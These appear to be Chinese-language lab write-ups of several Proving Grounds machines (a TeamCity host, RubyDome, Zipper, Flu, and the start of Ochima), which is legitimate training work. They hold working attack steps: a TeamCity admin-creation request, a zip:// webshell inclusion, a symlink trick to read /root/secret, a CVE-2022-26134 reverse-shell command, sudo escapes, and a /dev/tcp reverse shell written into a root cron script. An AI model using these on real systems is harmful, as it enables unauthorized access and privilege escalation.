PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
25/tcp  open   smtp    Postfix smtpd
|_smtp-commands: onlyrands.com, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 
| ssl-cert: Subject: commonName=onlyrands.com
| Subject Alternative Name: DNS:onlyrands.com
| Not valid before: 2024-06-07T09:33:24
|_Not valid after:  2034-06-05T09:33:24
|_ssl-date: TLS randomness does not represent time
80/tcp  open   http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: OnlyRands
443/tcp closed https
Aggressive OS guesses: HP P2000 G3 NAS device (91%), Linux 2.6.32 (90%), Infomir MAG-250 set-top box (90%), Ubiquiti AirMax NanoStation WAP (Linux 2.6.32) (90%), Ubiquiti AirOS 5.5.9 (90%), Ubiquiti Pico Station WAP (AirOS 5.2.6) (89%), Linux 2.6.32 - 3.13 (89%), Linux 3.3 (89%), Linux 2.6.32 - 3.1 (89%), Linux 3.7 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: Host:  onlyrands.com; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT     ADDRESS
1   2.17 ms 192.168.45.1
2   2.19 ms 192.168.45.254
3   3.82 ms 192.168.251.1
4   3.96 ms 192.168.216.91

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 103.98 seconds
```

80开放了http服务

![image-20250225184141616](./PG_linux.assets/image-20250225184141616.png)

点击login会跳转到teams.onlyrands.com，将解析加入hosts，重新点击login

![image-20250225192204802](./PG_linux.assets/image-20250225192204802.png)

发包添加用户

```
POST /pwned?jsp=/app/rest/users;.jsp HTTP/1.1
Host: teams.onlyrands.com
Content-Type: application/json

{"username": "test", "password": "test", "email": "test@test.com","roles": {"role": [{"roleId": "SYSTEM_ADMIN", "scope": "g"}]}}
```

使用test/test成功登录系统，检索漏洞

![image-20250225192429224](./PG_linux.assets/image-20250225192429224.png)

尝试利用漏洞均失败了，换了很多exp

![image-20250302204432010](./PG_linux.assets/image-20250302204432010.png)

在后台翻文件的时候发现了私钥文件

![image-20250302204800552](./PG_linux.assets/image-20250302204800552.png)

![image-20250302204825149](./PG_linux.assets/image-20250302204825149.png)

先用ssh2john转换格式

```
ssh2john id_rsa>hash.txt 
```

![image-20250302205204128](./PG_linux.assets/image-20250302205204128.png)

然后使用john破解

```
john hash.txt --wordlist=~/rockyou.txt 
```

![image-20250302205327324](./PG_linux.assets/image-20250302205327324.png)

得到密码cheer，使用用户：marcot，ssh登录系统（因为这个私钥是在marcot修改的

![image-20250302205432214](./PG_linux.assets/image-20250302205432214.png)

上传并运行linpeas.sh，有很多的Mails

![image-20250302210735416](./PG_linux.assets/image-20250302210735416.png)

直接`cat *`，发现用户凭证：IdealismEngineAshen476

![image-20250302210933886](./PG_linux.assets/image-20250302210933886.png)

成功切换matthewa用户

![image-20250302211238472](./PG_linux.assets/image-20250302211238472.png)

在用户根目录下存在一个隐藏文件

![image-20250302211622049](./PG_linux.assets/image-20250302211622049.png)

有拿到一个密码：RefriedScabbedWasting502

![image-20250302211654622](./PG_linux.assets/image-20250302211654622.png)

在`/etc/passwd`目录下找到Dach对应的用户：briand

![image-20250302211824398](./PG_linux.assets/image-20250302211824398.png)

成功切换，用户根目录为/home/administration/briand

![image-20250302211957711](./PG_linux.assets/image-20250302211957711.png)

用户可以sudo无密码执行`/usr/bin/systemctl status teamcity-server.service`

![image-20250302212014495](./PG_linux.assets/image-20250302212014495.png)

执行

```
sudo /usr/bin/systemctl status teamcity-server.service
```

然后输入`!sh`

![image-20250302212221062](./PG_linux.assets/image-20250302212221062.png)

拿到proof和local

![image-20250302212342991](./PG_linux.assets/image-20250302212342991.png)

## RubyDome

信息收集：

```
root@iZt4nbifrvtk7cy11744y4Z:/# nmap -p- -Pn -A -sS -T4 192.168.216.22
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-25 20:16 CST
Nmap scan report for 192.168.216.22
Host is up (0.0030s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
3000/tcp open  http    WEBrick httpd 1.7.0 (Ruby 3.0.2 (2021-07-07))
|_http-server-header: WEBrick/1.7.0 (Ruby/3.0.2/2021-07-07)
|_http-title: RubyDome HTML to PDF
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=2/25%OT=22%CT=1%CU=43100%PV=Y%DS=4%DC=T%G=Y%TM=67BDB4B
OS:A%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M54EST11NW7%O2=M54EST11NW7%O3=M54ENNT11NW7%O4=M54EST11NW7%O5=M54EST1
OS:1NW7%O6=M54EST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54ENNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%
OS:RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT     ADDRESS
1   2.08 ms 192.168.45.1
2   2.08 ms 192.168.45.254
3   2.91 ms 192.168.251.1
4   3.14 ms 192.168.216.22

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.90 seconds
```

开放了3000的http

![image-20250225203523881](./PG_linux.assets/image-20250225203523881.png)

尝试一些奇怪的字符，报错了

![image-20250225203555106](./PG_linux.assets/image-20250225203555106.png)

尝试检索PDFKit漏洞

![image-20250225203625662](./PG_linux.assets/image-20250225203625662.png)

将生成的payload进行url编码后放入URL字段，发包即可收到shell

![image-20250225203444702](./PG_linux.assets/image-20250225203444702.png)

拿到local

![image-20250225203653642](./PG_linux.assets/image-20250225203653642.png)

常规信息收集发现可以sudo无密码执行`/usr/bin/ruby /home/andrew/app/app.rb`

![image-20250225203937692](./PG_linux.assets/image-20250225203937692.png)

app.rb文件可以写入

![image-20250225204108256](./PG_linux.assets/image-20250225204108256.png)

```
mv app.rb app.rb.old
echo 'exec "/bin/sh"' > app.rb
sudo ruby /home/andrew/app/app.rb
```

成功提权

![image-20250225204254952](./PG_linux.assets/image-20250225204254952.png)

拿到proof

![image-20250225204348710](./PG_linux.assets/image-20250225204348710.png)

## Zipper

信息收集：

```
root@iZt4nbifrvtk7cy11744y4Z:~# nmap -p- -Pn -A -sS -T4 192.168.216.229
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-26 12:23 CST
Nmap scan report for 192.168.216.229
Host is up (0.0027s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Zipper
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=2/26%OT=22%CT=1%CU=30076%PV=Y%DS=4%DC=T%G=Y%TM=67BE974
OS:8%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M54EST11NW7%O2=M54EST11NW7%O3=M54ENNT11NW7%O4=M54EST11NW7%O5=M54EST1
OS:1NW7%O6=M54EST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54ENNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%
OS:RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8888/tcp)
HOP RTT     ADDRESS
1   2.35 ms 192.168.45.1
2   2.35 ms 192.168.45.254
3   2.43 ms 192.168.251.1
4   2.60 ms 192.168.216.229

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.48 seconds
```

开放了80的http服务，是一个zip打包网站

![image-20250226123026693](./PG_linux.assets/image-20250226123026693.png)

扫描目录发现`upload.php`文件

![image-20250226133720819](./PG_linux.assets/image-20250226133720819.png)

右键查看页面源代码发现疑似文件包含点

![image-20250226133612737](./PG_linux.assets/image-20250226133612737.png)

但是正常包含文件失败：`index.php?file=upload.php`，使用base成功读取home源代码

![image-20250226133826926](./PG_linux.assets/image-20250226133826926.png)

读取upload代码并进行审计

```
index.php?file=php://filter/convert.base64-encode/resource=upload
```

![image-20250226133919428](./PG_linux.assets/image-20250226133919428.png)

拿到upload功能源码

```
<?php
if ($_FILES && $_FILES['img']) {
    
    if (!empty($_FILES['img']['name'][0])) {
        
        $zip = new ZipArchive();
        $zip_name = getcwd() . "/uploads/upload_" . time() . ".zip";
        
        // Create a zip target
        if ($zip->open($zip_name, ZipArchive::CREATE) !== TRUE) {
            $error .= "Sorry ZIP creation is not working currently.<br/>";
        }
        
        $imageCount = count($_FILES['img']['name']);
        for($i=0;$i<$imageCount;$i++) {
        
            if ($_FILES['img']['tmp_name'][$i] == '') {
                continue;
            }
            $newname = date('YmdHis', time()) . mt_rand() . '.tmp';
            
            // Moving files to zip.
            $zip->addFromString($_FILES['img']['name'][$i], file_get_contents($_FILES['img']['tmp_name'][$i]));
            
            // moving files to the target folder.
            move_uploaded_file($_FILES['img']['tmp_name'][$i], './uploads/' . $newname);
        }
        $zip->close();
        
        // Create HTML Link option to download zip
        $success = basename($zip_name);
    } else {
        $error = '<strong>Error!! </strong> Please select a file.';
    }
}
```

没看出来什么漏洞，，，看了hints，参照这篇文章：https://rioasmara.com/2021/07/25/php-zip-wrapper-for-rce/

利用zip伪协议来直接解压压缩包（第一次实战遇到用`zip://`的，，

上传一句话木马shell.php，访问（这里注意不要在文件名后面添加.php，网页会自动加，就跟刚刚LFI直接用`index.php?file=php://filter/convert.base64-encode/resource=upload.php`读取不到一样：

```
index.php?file=zip://uploads/upload_1740549330.zip%23shell&shell=system('whoami');
```

成功getshell

![image-20250226140150030](./PG_linux.assets/image-20250226140150030.png)

反弹shell

![image-20250226140249141](./PG_linux.assets/image-20250226140249141.png)

拿到local

![image-20250226140319473](./PG_linux.assets/image-20250226140319473.png)

常规信息收集发现会定期运行脚本/opt/backup.sh

![image-20250226144316532](./PG_linux.assets/image-20250226144316532.png)

查看脚本

![image-20250226144415631](./PG_linux.assets/image-20250226144415631.png)

有一个命令值得注意，`$password`变量由cat /root/secret获取，会将日志信息输出到/opt/backups/backup.log文件中

```
7za a /opt/backups/backup.zip -p$password -tzip *.zip > /opt/backups/backup.log
```

查看log文件

![image-20250226144732467](./PG_linux.assets/image-20250226144732467.png)

那我们就需要通过这个报错日志读取`/root/secret`文件

> **软链接的创建：**
>
> - 攻击者通过 `ln -s /root/secret aaa.zip` 创建了一个软链接 `aaa.zip`，指向 `/root/secret` 文件。软链接的作用是让系统认为 `aaa.zip` 就是 `/root/secret` 文件，这意味着任何能读取 `aaa.zip` 文件的进程或用户，也会读取到 `/root/secret` 文件的内容。
>
> **攻击过程：**
>
> - 攻击者创建了一个名为 `@aaa.zip` 的文件，并将其放置在 `uploads` 目录中。这个文件本身是一个普通文件，名为 `@aaa.zip`，但其中的 `aaa.zip` 是一个软链接，指向 `/root/secret` 文件。
> - 该文件在文件系统中看起来是 `aaa.zip`，但是由于它是一个软链接，指向的是 `/root/secret` 文件。因此，只要可以读取 `aaa.zip` 文件的进程，就能间接地读取到 `/root/secret` 的内容。
>
> **为什么能读取 `/root/secret`：**
>
> - 在 cron 任务中执行的脚本 `/opt/backup.sh` 会扫描 `uploads` 目录中的文件，并且通过 `7za` 处理这些 `.zip` 文件。当 `7za` 处理到软链接文件时，它实际上读取的是软链接所指向的文件内容。尽管 `www-data` 用户没有权限直接读取 `/root/secret` 文件，但是因为软链接指向了这个文件，所以如果程序（在这种情况下是 `7za`）能够访问 `aaa.zip`，它就能读取 `/root/secret` 的内容。
>
> **读取 `/root/secret` 文件：**
>
> - 当执行 `7za` 创建压缩包时，它会处理文件（包括软链接）。所以，攻击者创建的软链接（`aaa.zip`）就指向了高权限的 `/root/secret` 文件。压缩包的创建过程中，`7za` 读取了软链接，并间接地读取了 `/root/secret` 的内容，从而泄露了文件的敏感信息。

但是其实我们查看uploads文件夹就会发现

![image-20250226152232266](./PG_linux.assets/image-20250226152232266.png)

所以`WildCardsGoingWild`就是/root/secret的内容，如果要自己复现就是：

> 在uploads目录下：
>
> ```
> touch @123.zip
> ln -s /root/secret 123.zip
> ```
>
> 然后查看/opt/backups/backup.log
>
> **由于该文件内容并非文件列表，所以会报错并显示出/root/secret的内容**

![image-20250226152259146](./PG_linux.assets/image-20250226152259146.png)

用密码切换为root，拿到proof

![image-20250226152906378](./PG_linux.assets/image-20250226152906378.png)

> 最后看了看别人的思路，这题还可以利用PwnKit（CVE-2021-4034）**python版本**提权
>
> ![image-20250226153816538](./PG_linux.assets/image-20250226153816538.png)

## Flu

信息收集：

```
root@iZt4nbifrvtk7cy11744y4Z:~# nmap -p- -Pn -A -sS -T4 192.168.216.41
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-26 15:40 CST
Nmap scan report for 192.168.216.41
Host is up (0.0029s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
8090/tcp open  opsmessaging?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 302 
|     Cache-Control: no-store
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     X-Confluence-Request-Time: 1740555626143
|     Set-Cookie: JSESSIONID=D518E2E9A0A5F7BFDA68A6A59D3D9A57; Path=/; HttpOnly
|     X-XSS-Protection: 1; mode=block
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: SAMEORIGIN
|     Content-Security-Policy: frame-ancestors 'self'
|     Location: http://localhost:8090/login.action?os_destination=%2Findex.action&permissionViolation=true
|     Content-Type: text/html;charset=UTF-8
|     Content-Length: 0
|     Date: Wed, 26 Feb 2025 07:40:26 GMT
|     Connection: close
|   HTTPOptions: 
|     HTTP/1.1 200 
|     MS-Author-Via: DAV
|     Content-Type: text/html;charset=UTF-8
|     Content-Length: 0
|     Date: Wed, 26 Feb 2025 07:40:26 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 1924
|     Date: Wed, 26 Feb 2025 07:40:26 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1><hr class="line" /><p><b>Type</b> Exception Report</p><p><b>Message</b> Invalid character found in the HTTP protocol [RTSP&#47;1.00x0d0x0a0x0d0x0a...]</p><p><b>Description</b> The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid
8091/tcp open  jamlink?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 204 No Content
|     Server: Aleph/0.4.6
|     Date: Wed, 26 Feb 2025 07:41:01 GMT
|     Connection: Close
|   GetRequest: 
|     HTTP/1.1 204 No Content
|     Server: Aleph/0.4.6
|     Date: Wed, 26 Feb 2025 07:40:31 GMT
|     Connection: Close
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Access-Control-Allow-Origin: *
|     Access-Control-Max-Age: 31536000
|     Access-Control-Allow-Methods: OPTIONS, GET, PUT, POST
|     Server: Aleph/0.4.6
|     Date: Wed, 26 Feb 2025 07:40:31 GMT
|     Connection: Close
|     content-length: 0
|   Help, Kerberos, LDAPSearchReq, LPDString, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 414 Request-URI Too Long
|     text is empty (possibly HTTP/0.9)
|   RTSPRequest: 
|     HTTP/1.1 200 OK
|     Access-Control-Allow-Origin: *
|     Access-Control-Max-Age: 31536000
|     Access-Control-Allow-Methods: OPTIONS, GET, PUT, POST
|     Server: Aleph/0.4.6
|     Date: Wed, 26 Feb 2025 07:40:31 GMT
|     Connection: Keep-Alive
|     content-length: 0
|   SIPOptions: 
|     HTTP/1.1 200 OK
|     Access-Control-Allow-Origin: *
|     Access-Control-Max-Age: 31536000
|     Access-Control-Allow-Methods: OPTIONS, GET, PUT, POST
|     Server: Aleph/0.4.6
|     Date: Wed, 26 Feb 2025 07:41:06 GMT
|     Connection: Keep-Alive
|_    content-length: 0
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8090-TCP:V=7.80%I=7%D=2/26%Time=67BEC56A%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,22F,"HTTP/1\.1\x20302\x20\r\nCache-Control:\x20no-store\r\nExp
SF:ires:\x20Thu,\x2001\x20Jan\x201970\x2000:00:00\x20GMT\r\nX-Confluence-R
SF:equest-Time:\x201740555626143\r\nSet-Cookie:\x20JSESSIONID=D518E2E9A0A5
SF:F7BFDA68A6A59D3D9A57;\x20Path=/;\x20HttpOnly\r\nX-XSS-Protection:\x201;
SF:\x20mode=block\r\nX-Content-Type-Options:\x20nosniff\r\nX-Frame-Options
SF::\x20SAMEORIGIN\r\nContent-Security-Policy:\x20frame-ancestors\x20'self
SF:'\r\nLocation:\x20http://localhost:8090/login\.action\?os_destination=%
SF:2Findex\.action&permissionViolation=true\r\nContent-Type:\x20text/html;
SF:charset=UTF-8\r\nContent-Length:\x200\r\nDate:\x20Wed,\x2026\x20Feb\x20
SF:2025\x2007:40:26\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(HTTPOptions
SF:,97,"HTTP/1\.1\x20200\x20\r\nMS-Author-Via:\x20DAV\r\nContent-Type:\x20
SF:text/html;charset=UTF-8\r\nContent-Length:\x200\r\nDate:\x20Wed,\x2026\
SF:x20Feb\x202025\x2007:40:26\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(R
SF:TSPRequest,820,"HTTP/1\.1\x20400\x20\r\nContent-Type:\x20text/html;char
SF:set=utf-8\r\nContent-Language:\x20en\r\nContent-Length:\x201924\r\nDate
SF::\x20Wed,\x2026\x20Feb\x202025\x2007:40:26\x20GMT\r\nConnection:\x20clo
SF:se\r\n\r\n<!doctype\x20html><html\x20lang=\"en\"><head><title>HTTP\x20S
SF:tatus\x20400\x20\xe2\x80\x93\x20Bad\x20Request</title><style\x20type=\"
SF:text/css\">body\x20{font-family:Tahoma,Arial,sans-serif;}\x20h1,\x20h2,
SF:\x20h3,\x20b\x20{color:white;background-color:#525D76;}\x20h1\x20{font-
SF:size:22px;}\x20h2\x20{font-size:16px;}\x20h3\x20{font-size:14px;}\x20p\
SF:x20{font-size:12px;}\x20a\x20{color:black;}\x20\.line\x20{height:1px;ba
SF:ckground-color:#525D76;border:none;}</style></head><body><h1>HTTP\x20St
SF:atus\x20400\x20\xe2\x80\x93\x20Bad\x20Request</h1><hr\x20class=\"line\"
SF:\x20/><p><b>Type</b>\x20Exception\x20Report</p><p><b>Message</b>\x20Inv
SF:alid\x20character\x20found\x20in\x20the\x20HTTP\x20protocol\x20\[RTSP&#
SF:47;1\.00x0d0x0a0x0d0x0a\.\.\.\]</p><p><b>Description</b>\x20The\x20serv
SF:er\x20cannot\x20or\x20will\x20not\x20process\x20the\x20request\x20due\x
SF:20to\x20something\x20that\x20is\x20perceived\x20to\x20be\x20a\x20client
SF:\x20error\x20\(e\.g\.,\x20malformed\x20request\x20syntax,\x20invalid\x2
SF:0");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8091-TCP:V=7.80%I=7%D=2/26%Time=67BEC56F%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,68,"HTTP/1\.1\x20204\x20No\x20Content\r\nServer:\x20Aleph/0\.4
SF:\.6\r\nDate:\x20Wed,\x2026\x20Feb\x202025\x2007:40:31\x20GMT\r\nConnect
SF:ion:\x20Close\r\n\r\n")%r(HTTPOptions,EC,"HTTP/1\.1\x20200\x20OK\r\nAcc
SF:ess-Control-Allow-Origin:\x20\*\r\nAccess-Control-Max-Age:\x2031536000\
SF:r\nAccess-Control-Allow-Methods:\x20OPTIONS,\x20GET,\x20PUT,\x20POST\r\
SF:nServer:\x20Aleph/0\.4\.6\r\nDate:\x20Wed,\x2026\x20Feb\x202025\x2007:4
SF:0:31\x20GMT\r\nConnection:\x20Close\r\ncontent-length:\x200\r\n\r\n")%r
SF:(RTSPRequest,F1,"HTTP/1\.1\x20200\x20OK\r\nAccess-Control-Allow-Origin:
SF:\x20\*\r\nAccess-Control-Max-Age:\x2031536000\r\nAccess-Control-Allow-M
SF:ethods:\x20OPTIONS,\x20GET,\x20PUT,\x20POST\r\nServer:\x20Aleph/0\.4\.6
SF:\r\nDate:\x20Wed,\x2026\x20Feb\x202025\x2007:40:31\x20GMT\r\nConnection
SF::\x20Keep-Alive\r\ncontent-length:\x200\r\n\r\n")%r(Help,46,"HTTP/1\.1\
SF:x20414\x20Request-URI\x20Too\x20Long\r\n\r\ntext\x20is\x20empty\x20\(po
SF:ssibly\x20HTTP/0\.9\)")%r(SSLSessionReq,46,"HTTP/1\.1\x20414\x20Request
SF:-URI\x20Too\x20Long\r\n\r\ntext\x20is\x20empty\x20\(possibly\x20HTTP/0\
SF:.9\)")%r(TerminalServerCookie,46,"HTTP/1\.1\x20414\x20Request-URI\x20To
SF:o\x20Long\r\n\r\ntext\x20is\x20empty\x20\(possibly\x20HTTP/0\.9\)")%r(T
SF:LSSessionReq,46,"HTTP/1\.1\x20414\x20Request-URI\x20Too\x20Long\r\n\r\n
SF:text\x20is\x20empty\x20\(possibly\x20HTTP/0\.9\)")%r(Kerberos,46,"HTTP/
SF:1\.1\x20414\x20Request-URI\x20Too\x20Long\r\n\r\ntext\x20is\x20empty\x2
SF:0\(possibly\x20HTTP/0\.9\)")%r(FourOhFourRequest,68,"HTTP/1\.1\x20204\x
SF:20No\x20Content\r\nServer:\x20Aleph/0\.4\.6\r\nDate:\x20Wed,\x2026\x20F
SF:eb\x202025\x2007:41:01\x20GMT\r\nConnection:\x20Close\r\n\r\n")%r(LPDSt
SF:ring,46,"HTTP/1\.1\x20414\x20Request-URI\x20Too\x20Long\r\n\r\ntext\x20
SF:is\x20empty\x20\(possibly\x20HTTP/0\.9\)")%r(LDAPSearchReq,46,"HTTP/1\.
SF:1\x20414\x20Request-URI\x20Too\x20Long\r\n\r\ntext\x20is\x20empty\x20\(
SF:possibly\x20HTTP/0\.9\)")%r(SIPOptions,F1,"HTTP/1\.1\x20200\x20OK\r\nAc
SF:cess-Control-Allow-Origin:\x20\*\r\nAccess-Control-Max-Age:\x2031536000
SF:\r\nAccess-Control-Allow-Methods:\x20OPTIONS,\x20GET,\x20PUT,\x20POST\r
SF:\nServer:\x20Aleph/0\.4\.6\r\nDate:\x20Wed,\x2026\x20Feb\x202025\x2007:
SF:41:06\x20GMT\r\nConnection:\x20Keep-Alive\r\ncontent-length:\x200\r\n\r
SF:\n");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=2/26%OT=22%CT=1%CU=34851%PV=Y%DS=4%DC=T%G=Y%TM=67BEC5D
OS:3%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M54EST11NW7%O2=M54EST11NW7%O3=M54ENNT11NW7%O4=M54EST11NW7%O5=M54EST1
OS:1NW7%O6=M54EST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M54ENNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%
OS:RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3306/tcp)
HOP RTT     ADDRESS
1   2.54 ms 192.168.45.1
2   2.54 ms 192.168.45.254
3   2.63 ms 192.168.251.1
4   2.85 ms 192.168.216.41

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 125.83 seconds
```

开放了8090和8091端口，只有8090的http服务能访问

![image-20250226172144653](./PG_linux.assets/image-20250226172144653.png)

在页面下面找到版本信息`Atlassian Confluence 7.13.6 `，检索漏洞找到CVE-2022-26134，先用poc试了一下，成功执行id命令

![image-20250226173123661](./PG_linux.assets/image-20250226173123661.png)

搜索利用exp：https://github.com/XiaomingX/CVE-2022-26134-poc

```
python3 poc.py --rhost 192.168.216.41 --rport 8090 --lhost 192.168.45.184 --lport 3000 --protocol http:// --reverse-shell
```

![image-20250226173425497](./PG_linux.assets/image-20250226173425497.png)

拿到local

![image-20250226173534311](./PG_linux.assets/image-20250226173534311.png)

信息收集发现root运行了一个/opt/log-backup.sh脚本

![image-20250226191048621](./PG_linux.assets/image-20250226191048621.png)

该脚本是目前shell用户的，可以编辑

![image-20250226191128448](./PG_linux.assets/image-20250226191128448.png)

修改脚本内容

```
echo "sh -i >& /dev/tcp/192.168.45.184/8001 0>&1" >> /opt/log-backup.sh
```

监听端口等一会拿到shell

![image-20250226192312020](./PG_linux.assets/image-20250226192312020.png)

拿到proof

![image-20250226192350886](./PG_linux.assets/image-20250226192350886.png)

## Ochima

信息收集：

```
root@iZt4nbifrvtk7cy11744y4Z:~# nmap -p- -Pn -A -sS -T4 192.168.216.32
Starting Nmap 7.80 ( https://nmap.org ) at 2025-02-27 12:50 CST
Nmap scan report for 192.168.216.32
Host is up (0.0029s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
8338/tcp open  unknown
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Server: Maltrail/0.52
|     Date: Thu, 27 Feb 2025 04:52:34 GMT
|     Connection: close
|     Content-Type: text/html
|     Last-Modified: Sat, 31 Dec 2022 22:58:57 GMT
|     Content-Security-Policy: default-src 'self'; style-src 'self' 'unsafe-inline'; img-src * blob:; script-src 'self' 'unsafe-eval' https://stat.ripe.net; frame-src *; object-src 'none'; block-all-mixed-content;
|     Cache-Control: no-cache
|     Content-Length: 7091
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta http-equiv="X-UA-Compatible" content="IE=edge">
|     <meta http-equiv="Content-Type" content="text/html;charset=utf8">
|     <meta name="viewport" content="width=device-width, user-scalable=no">
|     <meta name="robots" content="noindex, nofollow">
|     <title>Maltrail</title>
|     <link rel="stylesheet" type="text/css" href="css/thirdparty.min.css">
|     <link rel="stylesheet" type="text/css" hre
|   HTTPOptions: 
|     HTTP/1.0 501 Unsupported method ('OPTIONS')
